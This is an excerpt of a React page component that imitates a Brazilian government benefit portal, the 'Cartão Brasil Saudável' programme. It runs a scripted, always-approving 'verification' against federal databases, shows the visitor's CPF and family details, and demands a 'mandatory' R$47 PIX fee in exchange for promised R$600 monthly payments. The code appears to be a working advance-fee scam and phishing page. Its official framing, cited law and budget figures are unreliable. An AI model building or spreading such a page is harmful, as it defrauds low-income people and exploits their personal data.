...
export default function Home() {
  ...
  const consultingSteps = [
    "Conectando à Receita Federal",
    "Verificando situação do CPF",
    "Consultando base CadÚnico",
    "Verificando pendências",
    "Analisando critérios de elegibilidade",
    "Validando renda familiar",
    "Consultando histórico de benefícios",
    "Aprovando benefício"
  ];
  ...
  useEffect(() => {
    if (step === "consulting") {
      ...
      const processNextStep = () => {
        if (currentStep >= consultingSteps.length) {
          setStep("approved");
          return;
        }
        
        setConsultingStep(currentStep);
        setConsultingProgress(((currentStep + 1) / consultingSteps.length) * 100);
      ...
      const response = await fetch('/api/pix', {
        ...
        body: JSON.stringify({
          customer: {
            name: userData.NOME,
            cpf: userData.CPF,
            email: `${userData.CPF.replace(/\D/g, "")}@gov.br`,
            phone: "11999999999"
          }
        }),
      });
  ...
  // Helper para verificar se um campo tem dados válidos
  const hasData = (field: string) => {
    return field && field.trim() !== "" && field.trim() !== "0" && field.trim() !== "False";
  };
  ...
  return (
    <div className="min-h-screen bg-white">
      ...
      <main className="max-w-4xl mx-auto px-4">
          ...
          <div id="approved-section" className="py-8 lg:py-16 animate-in fade-in duration-1000">
            ...
            <Card className="mb-8 lg:mb-12 border border-gray-200 shadow-lg mx-4 lg:mx-0">
              <CardHeader>
                ...
                <p className="text-sm text-gray-600">Informações verificadas nos sistemas federais</p>
              </CardHeader>
              <CardContent className="p-4 lg:p-8">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 lg:gap-6">
                  ...
                  <div className="space-y-4">
                    ...
                    {hasData(userData.TITULO_ELEITOR) && (
                      <div>
                    ...
                    {/* UF de Emissão - se disponível */}
                    {hasData(userData.UF_EMISSAO) && (
                      <div>
                ...
                {/* Dados Familiares - apenas se disponíveis */}
                {(hasData(userData.NOME_MAE) || hasData(userData.NOME_PAI) || hasData(userData.ORGAO_EMISSOR)) && (
                  <div className="mt-6 pt-6 border-t border-gray-200">
                    <h4 className="text-sm font-bold text-gray-800 mb-4">Informações Complementares</h4>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {hasData(userData.NOME_MAE) && (
                        <div>
                      ...
                      {hasData(userData.ORGAO_EMISSOR) && (
                        <div>
                  ...
                  <div className="bg-gradient-to-br from-gray-200 to-gray-400 rounded-xl lg:rounded-2xl p-4 lg:p-8 shadow-xl aspect-[1.6/1] relative border border-gray-500">
                    ...
                    <div className="absolute bottom-4 lg:bottom-8 left-3 lg:left-6 right-3 lg:right-6">
                      <div className="space-y-2 lg:space-y-4">
                        ...
                        {/* Validade e Categoria responsivos */}
              ...
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto">
                  ...
                  <div className="p-8">
                    ...
                    <div className="mb-6">
                      <h4 className="text-lg font-bold text-gray-900 mb-4">A taxa de R$ 47,00 cobre os seguintes custos obrigatórios:</h4>
                      <div className="space-y-3">
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Processamento nos sistemas federais:</strong> Integração à Receita Federal, CadÚnico e Caixa Econômica Federal</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Produção do cartão físico:</strong> Fabricação com chip de segurança, tecnologia contactless e personalização</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Logística de entrega:</strong> Envio via Correios com rastreamento e seguro</p>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-2 h-2 bg-blue-600 rounded-full mt-2"></div>
                          <p className="text-gray-700"><strong>Ativação do sistema:</strong> Configuração dos créditos automáticos mensais de R$ 600</p>
                        </div>
                      </div>
                    </div>

                    <div className="bg-gray-50 p-6 rounded-lg mb-6">
                      <h4 className="font-bold text-gray-900 mb-3">Importantes esclarecimentos:</h4>
                      <ul className="space-y-2 text-sm text-gray-700">
                        <li>• Esta é uma <strong>taxa única</strong> - sem cobrança de mensalidades ou anuidades</li>
                        <li>• O pagamento é <strong>obrigatório</strong> conforme a legislação federal</li>
                        <li>• Após o pagamento, você receberá <strong>R$ 600 mensais</strong> durante todo o programa</li>
                        <li>• O cartão virtual é ativado <strong>imediatamente</strong> após confirmação do pagamento</li>
                        <li>• O cartão físico é enviado em até <strong>5 dias úteis</strong> para seu endereço</li>
                      </ul>
                    </div>
                    ...
                    <div className="mb-6">
                      <label className="flex items-start space-x-3 cursor-pointer">
                        ...
                        <span className="text-sm text-gray-700 leading-relaxed">
                          Declaro que li e estou ciente das informações acima. Confirmo que desejo gerar o pagamento 
                          da taxa administrativa de <strong>R$ 47,00</strong> para receber meu Cartão Brasil Saudável 
                          com limite mensal de <strong>R$ 600,00</strong> em alimentação saudável, conforme estabelecido 
                          na Lei Federal n° 14.628/2025.
                        </span>
                      </label>
                    </div>
        ...
        {/* Payment Section Focada */}
        {step === "payment" && pixData && userData && (
          <div id="pix-section" className="py-8 lg:py-16">
            <div className="max-w-2xl mx-auto">
              {/* Título Limpo */}
              <div className="text-center mb-8">
                <h2 className="text-2xl lg:text-3xl font-bold text-gray-900 mb-2">Pagamento da Taxa</h2>
                <p className="text-gray-600">R$ 47,00 • Pagamento único</p>
              </div>

              {/* PIX Section Mobile-First */}
              <Card className="border border-gray-200 shadow-lg">
                <CardHeader className="bg-blue-900 text-white text-center">
                ...
                <CardContent className="p-6">
                  {/* QR Code Centralizado para Mobile */}
        ...
        <div className="py-16 border-t border-gray-200">
          <div className="text-center mb-12">
            <h3 className="text-2xl font-bold text-gray-900">Marco Legal do Programa</h3>
          </div>
          <div className="grid md:grid-cols-3 gap-8 text-center">
            <div className="p-8">
              <p className="text-sm text-gray-500 uppercase tracking-wide mb-2">Lei Federal</p>
              <p className="text-2xl font-bold text-blue-900 mb-2">14.628/2025</p>
              <p className="text-sm text-gray-600">Institui o Programa Brasil Saudável</p>
            </div>
            <div className="p-8">
              <p className="text-sm text-gray-500 uppercase tracking-wide mb-2">Orçamento Aprovado</p>
              <p className="text-2xl font-bold text-blue-900 mb-2">R$ 17,2 bilhões</p>
              <p className="text-sm text-gray-600">Exercício fiscal 2025</p>
            </div>
            <div className="p-8">
              <p className="text-sm text-gray-500 uppercase tracking-wide mb-2">Meta de Atendimento</p>
              <p className="text-2xl font-bold text-blue-900 mb-2">2,4 milhões</p>
              <p className="text-sm text-gray-600">Famílias em vulnerabilidade</p>
            </div>
          </div>
        </div>
      </main>
